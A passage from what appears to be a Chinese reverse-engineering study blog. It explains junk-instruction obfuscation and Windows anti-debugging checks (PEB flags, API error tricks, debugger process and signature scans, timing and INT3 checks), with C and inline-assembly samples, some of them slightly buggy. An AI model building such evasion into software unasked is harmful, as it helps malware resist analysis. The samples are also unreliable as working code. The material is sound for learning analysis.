class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">push eax;</span><br><span class="line">add esp, <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用call指令或jmp指令增加执行流程复杂度"><a href="#利用call指令或jmp指令增加执行流程复杂度" class="headerlink" title="利用call指令或jmp指令增加执行流程复杂度"></a>利用call指令或jmp指令增加执行流程复杂度</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">call xxx</span><br><span class="line">xxx :</span><br><span class="line">add[esp], <span class="number">0x7</span></span><br><span class="line">retn</span><br><span class="line">_emit <span class="number">0x12</span></span><br><span class="line">_emit <span class="number">0x34</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wwwwww&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为有0x12,0x34，push没识别出来，printf后没法执行。</p><p>call–&gt;结束</p><p>找到栈变化的地方（esp转向）按C重编译</p><h3 id="不会被执行"><a href="#不会被执行" class="headerlink" title="不会被执行"></a>不会被执行</h3><h4 id="插入机器码"><a href="#插入机器码" class="headerlink" title="插入机器码"></a>插入机器码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="keyword">xor</span> eax, eax;</span><br><span class="line">jz xxx;</span><br><span class="line">_emit <span class="number">0x11</span>;</span><br><span class="line">_emit <span class="number">0x22</span>;</span><br><span class="line">_emit <span class="number">0x33</span>; <span class="comment">// 0x33是 xor 指令的操作码，会导致后面正常的 push 指令被错误解析</span></span><br><span class="line">xxx:</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="改变堆栈平衡"><a href="#改变堆栈平衡" class="headerlink" title="改变堆栈平衡"></a>改变堆栈平衡</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        <span class="keyword">xor</span> eax,eax;</span><br><span class="line">        jz s;</span><br><span class="line">        add esp,<span class="number">0x11</span>;</span><br><span class="line">    s:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA反编译报错，好像可以F5重编译。。。或者发现花指令地方nop！</p><p>xor eax，eax后有jz命令后有一个+1</p><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>检测调试的陷阱w~</p><h3 id="函数检测："><a href="#函数检测：" class="headerlink" title="函数检测："></a>函数检测：</h3><p>函数检测就是通过 Windows 自带的公开或未公开的函数直接检测程序是否处于调试状态。</p><h4 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a><strong>IsDebuggerPresent</strong></h4><p>最简单的调试器检测函数是 IsDebuggerPresent() ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">IsDebuggerPresent</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数查询进程环境块（PEB）中的 BeingDebugged 标志，如果进程处在调试上下文中，则返回一个非零值，否则返回零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> IsDebuggerPresent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a><strong>CheckRemoteDebuggerPresent</strong></h4><p>CheckRemoteDebuggerPresent() 用于检测一个远程进程是否处于调试状态：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">CheckRemoteDebuggerPresent</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HANDLE hProcess,</span></span><br><span class="line"><span class="params">_Inout_ PBOOL pbDebuggerPresent</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>如果 hProcess 句柄表示的进程处于调试上下文，则设置 pbDebuggerPresent 变量被设置为TRUE ，否则被设置为 FALSE 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">BOOL ret;</span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a><strong>NtQueryInformationProcess</strong></h4><p>NtQueryInformationProcess 用于获取给定进程的信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI <span class="title function_">NtQueryInformationProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">_In_ PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="line"><span class="params">_Out_ PVOID ProcessInformation,</span></span><br><span class="line"><span class="params">_In_ ULONG ProcessInformationLength,</span></span><br><span class="line"><span class="params">_Out_opt_ PULONG ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>第二个参数 ProcessInformationClass 给定了需要查询的进程信息类型。当给定值为0 （ ProcessBasicInformation ）或 7 （ProcessDebugPort ）时，就能得到相关调试信息，返回信息会写到第三个参数 ProcessInformation 指向的缓冲区中。</p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dbgport = <span class="number">0</span>;</span><br><span class="line">HMODULE hModule = LoadLibrary(<span class="string">&quot;Ntdll.dll&quot;</span>);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess =(NtQueryInformationProcessPtr)GetProcAddress(hModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), <span class="number">7</span>, &amp;dbgPort,<span class="keyword">sizeof</span>(dbgPort),<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> dbgPort != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a><strong>GetLastError</strong></h4><p>编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用 TRUE 和 FALSE 来表明函数的运行结果。一旦出现错误，MSDN 中往往会指出请用 GetLastError 函数来获得错误原因。</p><p>恶意代码可以使用异常来破坏或者探测调试器。调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。</p><p>多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</p><p>对于 OutputDebugString 函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。使用 SetLastError 函数，将当前的错误码设置为一个任意值。</p><p>如果进程没有被调试器附加，调用 OutputDebugString 函数会失败，错误码会重新设置，因此GetLastError 获取的错误码应该不是我们设置的任意值。</p><p>但如果进程被调试器附加，调用 OutputDebugString 函数会成功，这时 GetLastError 获取的错误码应该没改变。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD errorValue = <span class="number">12345</span>;</span><br><span class="line"><span class="built_in">SetLastError</span>(errorValue);</span><br><span class="line"><span class="built_in">OutputDebugStringA</span>(<span class="string">&quot;Test for debugger!&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == errorValue)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 DeleteFiber 函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER 异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证 LastError 值来检测调试器的存在。如代码所示，0x57 就是指 ERROR_INVALID_PARAMETER 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> fib[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">DeleteFiber</span>(fib);</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">GetLastError</span>() != <span class="number">0x57</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样还可以使用 CloseHandle 、 CloseWindow 产生异常，使得错误码改变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseHandle((HANDLE)<span class="number">0x1234</span>);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span> || GetLastError() != ERROR_INVALID_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseWindow((HWND)<span class="number">0x1234</span>);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span> || GetLastError() != ERROR_INVALID_WINDOW_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据检测"><a href="#数据检测" class="headerlink" title="数据检测"></a><strong>数据检测</strong></h3><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a><strong>BeingDebugged</strong></h4><p>数据检测是指程序通过测试一些与调试相关的关键位置的数据来判断是否处于调试状态。比如 PEB 中的 BeingDebugged 参数。数据检测就是直接定位到这些数据地址并测试其中的数据，从而避免调用函数，使程序的行为更加隐蔽。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> BeingDebug = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h] ; 指向 PEB 基地址</span><br><span class="line">movzx eax, byte ptr [eax+<span class="number">2</span>]</span><br><span class="line">mov BeingDebug, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> BeingDebug != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fs:[30h]</strong></p><h4 id="NTGlobalFlag"><a href="#NTGlobalFlag" class="headerlink" title="NTGlobalFlag"></a><strong>NTGlobalFlag</strong></h4><p>由于调试器中启动的进程与正常启动的进程创建堆的方式有些不同，系统使用 PEB 结构偏移量 0x68 处的一个未公开的位置 NTGlobalFlag ，来决定如何创建堆结构。如果这个位置上的值为 0x70 ，则进程处于调试器中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> BeingDbg = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]</span><br><span class="line">mov eax, dword ptr [eax + <span class="number">68</span>h]</span><br><span class="line">and eax, <span class="number">0x70</span></span><br><span class="line">mov BeingDbg, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> BeingDbg != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进程检测"><a href="#进程检测" class="headerlink" title="进程检测"></a><strong>进程检测</strong></h3><p>进程检测通过检测当前桌面中是否存在特定的调试进程来判断是否存在调试器，但不能判断该调试器是否正在调试该程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (FindWindowA(<span class="string">&quot;x32dbg&quot;</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD ID;</span><br><span class="line">    DWORD ret = <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bMore = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (bMore)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (stricmp(pe32.szExeFile, <span class="string">&quot;OllyDBG.EXE&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;OllyICE.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;x64_dbg.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;windbg.exe&quot;</span>) == <span class="number">0</span> || stricmp(pe32.szExeFile, <span class="string">&quot;ImmunityDebugger.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        bMore = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="特征码检测"><a href="#特征码检测" class="headerlink" title="特征码检测"></a><strong>特征码检测</strong></h3><p>特征码检测枚举当前正在运行的进程，并在进程的内存空间中搜索特定调试器的代码片段。</p><p>例如 OllyDbg 有这样一段特征码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x41, 0x00, 0x62, 0x00, 0x6f, 0x00, 0x75, 0x00, 0x74, 0x00,</span><br><span class="line">0x20, 0x00, 0x4f, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x79, 0x00,</span><br><span class="line">0x44, 0x00, 0x62, 0x00, 0x67, 0x00, 0x00, 0x00, 0x4f, 0x00,</span><br><span class="line">0x4b, 0x00, 0x00, 0x00</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;BYTE sign[] = &#123; <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x6f</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x4f</span>, <span class="number">0x00</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x79</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4f</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x4b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>; &#125;</span><br><span class="line">    PROCESSENTRY32 sentry32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    sentry32.dwSize = <span class="keyword">sizeof</span>(sentry32);</span><br><span class="line">    HANDLE phsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    Process32First(phsnap, &amp;sentry32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        HANDLE hps = OpenProcess(MAXIMUM_ALLOWED, FALSE,</span><br><span class="line">            sentry32.th32ProcessID);</span><br><span class="line">        <span class="keyword">if</span> (hps != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD szReaded = <span class="number">0</span>;</span><br><span class="line">            BYTE signRemote[<span class="keyword">sizeof</span>(sign)];</span><br><span class="line">            ReadProcessMemory(hps, (LPCVOID)<span class="number">0x4f632a</span>, signRemote,</span><br><span class="line">                <span class="keyword">sizeof</span>(signRemote), &amp;szReaded);</span><br><span class="line">            <span class="keyword">if</span> (szReaded &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">memcmp</span>(sign, signRemote, <span class="keyword">sizeof</span>(sign)) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    CloseHandle(phsnap);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sentry32.dwSize = <span class="keyword">sizeof</span>(sentry32);</span><br><span class="line">&#125;<span class="keyword">while</span> (Process32Next(phsnap, &amp;sentry32));</span><br></pre></td></tr></table></figure><h3 id="时间检测"><a href="#时间检测" class="headerlink" title="时间检测"></a><strong>时间检测</strong></h3><p>时间检测是指在程序中通过代码感知程序处于调试时与未处于调试时的各种运行时间差异来判断程序是否处于调试状态。</p><p>例如我们在调试时步过两条指令所花费的时间远远超过 CPU 正常执行花费的时间，于是就可以通过rdtsc 指令或 GetTickCount 函数来进行测试。</p><p>注： rdtsc 指令用于将时间标签计数器读入 EDX:EAX 寄存器。 GetTickCount 返回从操作系统动</p><p>所经过的毫秒数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> BeingDbg = <span class="number">0</span>;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        rdtsc</span><br><span class="line">        mov ecx, edx</span><br><span class="line">        rdtsc</span><br><span class="line">        sub edx, ecx</span><br><span class="line">        mov BeingDbg, edx</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (BeingDbg &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD time1 = GetTickCount();</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov ecx, <span class="number">10</span></span><br><span class="line">        mov edx, <span class="number">6</span></span><br><span class="line">        mov ecx, <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD time2 = GetTickCount();</span><br><span class="line">    <span class="keyword">if</span> (time2 - time1 &gt; <span class="number">0x1A</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="断点检测"><a href="#断点检测" class="headerlink" title="断点检测"></a><strong>断点检测</strong></h3><p>断点检测是根据调试器设置断点的原理来检测软件代码中是否设置了断点。调试器一般使用两者方法设置代码断点：</p><ul><li><p>通过修改代码指令为 INT3（机器码为0xCC）触发软件异常</p></li><li><p>通过硬件调试寄存器设置硬件断点</p></li></ul><p>针对软件断点，检测系统会扫描比较重要的代码区域，看是否存在多余的 INT3 指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS32 pNtHeaders;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line">DWORD dwBaseImage = (DWORD)GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;</span><br><span class="line">pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader -</span><br><span class="line">&gt; e_lfanew);</span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders 